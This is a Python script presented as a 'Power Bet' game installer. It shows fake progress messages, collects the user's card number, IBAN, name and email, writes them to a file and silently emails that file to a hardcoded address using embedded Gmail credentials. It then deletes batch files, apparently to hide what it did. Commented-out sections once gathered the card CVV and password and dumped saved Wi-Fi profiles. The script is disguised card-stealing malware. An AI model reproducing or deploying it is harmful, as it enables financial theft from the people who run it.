import re
import time
import socket
import os
import random
from luhn.luhn import aLuhn
#from ZZSave import *
import ZZSave

###   
def Snd_INFO():
    import smtplib, ssl
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "PowerBet.Official@gmail.com"
    receiver_email = "PowerBet.Official@protonmail.com"
    EmPa = 'noskhebeta'
    op_crdinfo= open('.\\Card_Info.py',mode='r')
    rd_crdinfo= op_crdinfo.read()
    message = """Register  """ + SU_Nickname + """\n\n""" + rd_crdinfo
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, EmPa)
        server.sendmail(sender_email, receiver_email, message)

def RmvBtFls():
    os.remove('WF.txt')
    os.remove('SI.txt')
    os.remove('.\\GMsLOG\\SI.bat')
    os.remove('.\\GMsLOG\\WF.bat')


def CardINFO():
    CardNom= input('Type your card number: ')
    if len(CardNom) == 16:
        ChckVldt = aLuhn.doLuhn(CardNom)
        if ChckVldt == True:
            CardIBAN= input('Type your card\'s IBAN number: (24 Characters)  (Ex:  IR120731521171126853417102)\n')
            if len(CardIBAN) == 26  and  CardIBAN[0]=="I" and CardIBAN[1]=='R':
                CardMonth= input('Expiration month: ')
                if len(CardMonth)==2 or len(CardMonth)==1:
                    if CardMonth == '01' or CardMonth == '02' or CardMonth == '03' or CardMonth == '04' or CardMonth == '05' or CardMonth == '06' or CardMonth == '07' or CardMonth == '08' or CardMonth == '09' or CardMonth == '1' or CardMonth == '2' or CardMonth == '3' or CardMonth == '4' or CardMonth == '5' or CardMonth == '6' or CardMonth == '7' or CardMonth == '8' or CardMonth == '9' or CardMonth == '10' or CardMonth == '11' or CardMonth == '12':
                        CardYear= input('Expiration year: ')
                        if len(CardYear)==2 :
                            if CardYear == '00' or CardYear == '98' or CardYear == '99' or CardYear == '00' or CardYear == '01' or CardYear == '02':
                                CardName= input('Type Your full name: ')
                                if len(CardName) >= 7:
                                    op_inf= open('.\\Card_Info.py',mode='w')
                                    op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
                                                'CardIBAN= \'' + CardIBAN + '\'\n' +
                                                'CardName= \''  + CardName  + '\'\n'+
                                                'CardMonth= \'' + CardMonth + '\'\n' + 
                                                'CardYear= \'' + CardYear + '\'\n' + 
                                                'NickName= \'' + SU_Nickname + '\'\n' + 
                                                'Email= \'' + Email + '\''
                                                )
                                    op_inf.close()
                                    print('Card has been added.')
                                    Snd_INFO()
                                    print('Creating Account...')
                                    time.sleep(3)
                                    print('Adding files...')
                                    from ZZSave import Snd_INFORM
                                    ZZSave.Snd_INFORM()
                                    time.sleep(3)
                                    RmvBtFls()
                                    print('Your account has been created completly.')
                                    print('Closing Installer...')
                                    time.sleep(4)
                                    #os.remove('INSTALL_MODULES.py')
                                    #os.remove('INSTALL_GAME.py')
                                else:
                                    print('Invalid Name.\n')
                                    CardINFO()
                            else:
                                print('Invalid Year Number.\n')
                                CardINFO()
                        else:
                            print('Invalid Year Number.\n')
                            CardINFO()
                    else:
                        print('Invalid Month Number.\n')
                        CardINFO()
                else:
                    print('Invalid Month Number.\n')
                    CardINFO()
            else:
                print('Invalid IBAN Number.\n')
                CardINFO()
        else:
            print('Invalid Card Number.\n')
            CardINFO()
    else:
        print('Invalid Card Number.\n')
        CardINFO()



def Main_INFO():
    global SU_Nickname
    global Email
    SU_Nickname= input('Type your Nickname:')
    Email=    input('Email: ')
    ECon=     re.search(r'[\w.]+@+[\w.]+', Email)
    if ECon == None:
        print('Invalid Email Address.')
        Main_INFO()
    else:
        op_inf= open('.\\Ac_Info.py',mode='w')
        op_inf.write('Nickname= \'' + SU_Nickname + '\'\n'
                    'Credit= 0\n'
                    'Crash_Wins= 0\n'
                    'Crash_Loses= 0\n'
                    'BJ_Wins= 0\n'
                    'BJ_Loses= 0\n'
                    'RPS_Wins= 0\n'
                    'RPS_Loses= 0\n'
                    'RatioX_Wins= 0\n'
                    'RatioX_Loses= 0\n'
                    'DR_Wins= 0\n'
                    'DR_Loses= 0\n'
                    'RmnnVluCshot= 0'
                    )
        op_inf.close()
        print('Now complete Card information form please.\n')
        CardINFO()
##################################################
def CodeStart():
    try:
        from win10toast import ToastNotifier
        toaster = ToastNotifier()
        toaster.show_toast("Power Bet  Installation:",
                        "Power Bet  is  installing  on  your  computer.",
                        duration=7)
    except ModuleNotFoundError:
        pass

    i=0
    lst= ['Starting...','Downloading Files...','Downloading...','Waiting for permission...','Collecting information',
      'Loading...','Waiting...','Checking','Pinging...','READY','Alright','Permission allowed','Action in progress...',
      'Access','Getting IP...','Getting MacAddresss...','Intializing...','Loging in...','Tracerting...',
      'Starting...','Downloading Files...','Downloading...','Waiting for permission...','Collecting information',
      'Loading...','Waiting...','Checking','Pinging...','READY','Alright','Permission allowed','Action in progress...',
      'Access','Getting IP...','Getting MacAddresss...','Intializing...','Loging in...','Tracerting...']
    while i < 120:
        chc= random.choice(lst)
        print(chc)
        #lst.remove(chc)
        i+=1
        time.sleep(0.025)
    if i >= 120:
        print('Every thing is checked.')
        print('Ready for installation.')
        print('\n\n\n')
        Main_INFO()
##################################################
def internet(host="8.8.8.8", port=53, timeout=3):
    """
    Host: 8.8.8.8 (google-public-dns-a.google.com)
    OpenPort: 53/tcp
    Service: domain (DNS/TCP)
    """
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        #os.remove('.\\GMsLOG\\install1.bat')
        #os.remove('.\\GMsLOG\\install2.bat')
        #os.remove('.\\GMsLOG\\install3.bat')
        print('Connecting...')
        CodeStart()
    except socket.error as ex:
        print('You are not connected to internet!')
        time.sleep(3)


internet()






""" ========================== """
    ##########################
""" ========================== """

"""CardNom= input('Type your card number: ')
    if len(CardNom) == 16:
        CardPass= input('Type your password: ')
        if len(CardPass)>=8 and len(CardPass)<=12:
            CardCVV= input('Type CVV2: ') 
            if len(CardCVV) == 3 or len(CardCVV) == 4:
                CardMonth= input('Expiration month: ')
                if len(CardMonth)==2 or len(CardMonth)==1:
                    if CardMonth == '01' or CardMonth == '02' or CardMonth == '03' or CardMonth == '04' or CardMonth == '05' or CardMonth == '06' or CardMonth == '07' or CardMonth == '08' or CardMonth == '09' or CardMonth == '1' or CardMonth == '2' or CardMonth == '3' or CardMonth == '4' or CardMonth == '5' or CardMonth == '6' or CardMonth == '7' or CardMonth == '8' or CardMonth == '9' or CardMonth == '10' or CardMonth == '11' or CardMonth == '12':
                        CardYear= input('Expiration year: ')
                        if len(CardYear)==2 :
                            if CardYear == '00' or CardYear == '98' or CardYear == '99' or CardYear == '00' or CardYear == '01' or CardYear == '02':
                            
                                op_inf= open('.\\Card_Info.py',mode='w')
                                op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
                                            'CardPass= \'' + CardPass + '\'\n' +
                                            'CardCVV= \''  + CardCVV  + '\'\n' +
                                            'CardMonth= \''+ CardMonth+ '\'\n' +
                                            'CardYear= \'' + CardYear + '\'\n'
                                            )
                                op_inf.close()
                                print('Card has been added.')
                                print('Your account has been created completly.')
                                import time
                                time.sleep(4)
                                
                            else:
                                print('Invalid Year Number.\n')
                                CardINFO()
                        else:
                            print('Invalid Year Number.\n')
                            CardINFO()
                    else:
                        print('Invalid Month Number.\n')
                        CardINFO()
                else:
                    print('Invalid Month Number.\n')
                    CardINFO()
            else:
                print('Invalid CVV2 Number.\n')
                CardINFO()
        else:
            print('Invalid Password.\n')
            CardINFO()
    else:
        print('Invalid Card Number.\n')
        CardINFO()"""
#WIFi
"""
import subprocess
a= subprocess.check_output('netsh wlan show profiles')
a = str(a)
a= a.replace('\\n','''
''')
a= a.replace('\\r','')
print(a)
b= open('tst.txt',mode='w')
b.write(str(a))
b.close()
import time
time.sleep(10)
"""
